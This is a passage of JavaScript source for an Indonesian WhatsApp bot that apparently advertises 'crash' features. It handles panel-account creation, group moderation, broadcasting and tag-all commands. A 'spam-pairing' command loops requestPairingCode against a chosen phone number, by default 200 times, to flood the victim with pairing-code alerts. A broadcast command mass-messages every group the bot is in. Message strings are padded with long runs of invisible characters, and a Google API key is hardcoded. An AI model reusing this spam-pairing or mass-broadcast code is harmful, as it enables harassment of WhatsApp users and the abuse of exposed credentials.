 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*Berhasil Membuat Akun Panel Anda ✅*
Data Akun Sudah Dikirim Ke Nomor ${u.split`@`[0]}
`)

}
break
case "pairing":
			case "spam-pairing": {
				if (!isOwner) return reply(mess.owner)
				if (!q) return reply(`*Syntax Error!*\n\n_Use : .spam-pairing NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻 (𝐜𝐫𝐚𝐬𝐡)👿`)
				let [peenis, pepekk = "200"] = q.split("|")
				await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
				let target = peenis.replace(/[^0-9]/g, '').trim()
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require("./node_modules/@whiskeysockets/baileys")
				let {
					state
				} = await useMultiFileAuthState('sessions')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let sucked = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await client.requestPairingCode(target)
					await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
			break
case "broadcast": case "bcgc": case "jpm": {
if (!isOwner) return reply(mess.owner)
if (!q) return reply(".${command} teksnya")
let allgrup = await client.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await reply(`Memproses *${command}* teks Ke ${res.length} grup`)
for (let i of res) {
try {
await client.sendMessage(i, {text: `${teks}`}, {quoted: qJpm})
} catch {}
await sleep(10000)
}
await client.sendMessage(m.chat, {text: `*[!] ${command} Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qJpm})
}
break
case "addprem":{ 

if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{ 

if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "addmurbug":{ 
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
bugg.push(prrkek)
fs.writeFileSync("./database/murbug.json", JSON.stringify(bugg))
reply(`Nomor ${prrkek} Telah Menjadi Member Murbug!`)
}
break
case "delmurbug":{ 
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = bugg.indexOf(ya)
bugg.splice(unp, 1)
fs.writeFileSync("./database/murbug.json", JSON.stringify(bugg))
reply(`Nomor ${ya} Telah Di Hapus Dari Murbug!`)
}
break
case 'public': { 
if (!isOwner) return reply(mess.only.owner)
client.public = true
reply('Succes Mode Public')
}
break
//cmd grup
//=================================================//

//=================================================//
case 'kick': {
if (!isGroup) return reply(`*Khusus grup*`)
if (!isOwner && !isAdmins) return reply(`*Khusus admin blok*`)
if (!isBotAdmins) return reply(`*Botnya jadiin admib dulu kocak*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await client.groupMetadata(m.chat);
const memberJids = participants.participants.map(member => member.jid);
if (!memberJids.includes(users)) {
m.reply('Target tidak ditemukan di grup.');
} else {
await client.groupParticipantsUpdate(m.chat, [users], 'remove');
m.reply('Sukses kick target.');
}} catch (err) {
m.reply('Terjadi kesalahan.');
}}
break

case 'add': {
if (!m.isGroup) return reply(`*harus di dalam grup*`)
if (!isOwner && !isAdmin) return reply(`*Khusus owner & admin blok*`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await client.groupMetadata(m.chat);
const memberJids = participants.participants.map(member => member.jid);
if (memberJids.includes(users)) {
m.reply('Target sudah menjadi anggota grup sebelumnya.');
} else {
await client.groupParticipantsUpdate(m.chat, [users], 'add');
m.reply('Sukses add target.');
}} catch (err) {
m.reply('Terjadi kesalahan.');
}}
break

//action grup


case 'revoke': {
if (!isGroup) return reply(`Khusu grup blok goblok`)
if (!isAdmin) return reply(`*Khusus admin blok goblok*`)
if (!isBotAdmins) return reply(`*Bot harus menjadi admin*`)
await client.groupRevokeInvite(m.chat)
.then( res => {
m.reply(`Sukses menyetel ulang link grup`)
}).catch(() => m.reply('Terjadi kesalahan'))
}
break

case 'promote': {
if (!isGroup) return reply(`Khusus di dalam grup blok goblok`)
if (!isOwner && !isAdmin) return reply(`*khusus admin blok goblok*`)
if (!isBotAdmins) return reply(`bot harus menjadi admin`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'demote': {
if (!isGroup) return reply(`*Khusus di dalam grup blok goblok*`)
if (!isOwner && !isAdmin) return reply(`*Khusus admin blok goblok*`)
if (!isBotAdmins) return reply(`*Bot harus menjadi admin*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'open': 
case 'buka': {
if (!isGroup) return reply(`*Khusus di dalam grup blok goblok*`)
if (!isAdmin) return reply(`Khusus admin blok goblok`)
if (!isBotAdmins) return reply(`*Bot harus menjadi admin*`)
client.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Sukses membuka grup`)
}
break

case 'close': 
case 'tutup': {
if (!isGroup) return reply(`*Khusus di dalam grup blok goblok*`)
if (!isAdmin) return reply(`*Khusus admin blok goblok*`)
if (!isBotAdmins) return reply(`Bot belum menjadi admin`)
client.groupSettingUpdate(m.chat, 'announcement')
m.reply(`*Sukses menutup grup*`)
}
break

//stiker
 

case "tagall": {
				if (!isGroup) return reply(`Khusus di dalam grup`)
				if (!isAdmin) return reply(`Khusus admin blok goblok`)
				if (!q) return reply(`Masukan Teks!!`)
				let teks = `${q ? q : ""}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
				for (let mem of participants) {
					teks += `⊝ @${mem.id.split("@")[0]}\n`
				}
				client.sendMessage(m.chat, {
					text: teks,
					mentions: participants.map(a => a.id)
				}, {
					quoted: m
				})
			}
			break

		//=================================================//
			case "runtime":
				reply(`*Bot aktif selama:* ${runtime(process.uptime())}`)
				break
				//=================================================//
			
case 'assalamualaikum': {
client.sendMessage(m.chat, { text: `waalaikumsalam`}, { quoted: m })
}
break 
    
case "emojimix": {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return reply(`*Example: ${prefix+command} 😅 + 🤔*`)
if (!emoji2) return joreply(`*Example: ${prefix+command} 😅 + 🤔*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await client.sendSticker(m.chat, res.url, m, { packname: global.owner, author: global.namabot, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break

case 'woi': case 'deck': case 'dick': case 'dek': case 'bocil': case 'esempe': case 'cil': case 'cill': case 'p': {
if (isGroup) return; 
reply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.

islam: Assalamualaikum
kristen: Shalom
hindu: Swastyastu
buddha: Sotthi Jitu
konghucu: Wei De Dong Tian
Atheis/Gapunya Agama/Orang Gila: ${command}`)
}
break

case 'infogc': {
if(!isGroup) return reply(`Hanya bisa di dalam group`)
let _meta = await client.groupMetadata(m.chat)
console.log(_meta)
let _img = await client.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
